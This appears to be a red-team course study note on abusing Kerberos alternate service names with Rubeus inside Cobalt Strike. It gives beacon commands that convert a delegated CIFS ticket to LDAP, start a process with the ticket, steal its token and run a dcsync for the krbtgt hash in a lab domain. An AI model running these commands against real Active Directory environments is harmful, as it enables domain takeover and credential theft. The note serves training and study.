
The [[Service Principal Name (SPN)]] information in the [[Ticket Granting Ticket (TGT)]] is not encrypted and can be changed arbitrarily.
We can request a service for one thing, but then modify the SPN to have further actions into another service.

### 🖊️ via Cobalt Strike

1) You will need to obtain a TGT, via a method like [[Constrained Delegation]] 
2) With the TGT at hand, we will request a new TGS but for a different service than this was originally created for using flag `altservice`

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

In this example, during the constrained delegation process we got a ticket for [[CIFS]] service. We alternate it to an ldap  ticket.

3) With the new ticket we can create a new local process with the integrity of the ticket and then [[Steal the token]] to further do actions in the remote machine

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
	
[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2580
[+] Ticket successfully imported!
[+] LUID            : 0x4b328e
			
beacon> steal_token 2580
```

4) You could try something like a dcsync against the DC with this new token

`beacon> dcsync dev.cyberbotic.io DEV\krbtgt`

What's important is that now you have a token with certain users integrity and able to execute actions on the remote box. 

### ⚠ Opsec




### Properties
---
📆 created   {{19-02-2024}} 09:28
🏷️ tags: #redteam #crto 

---

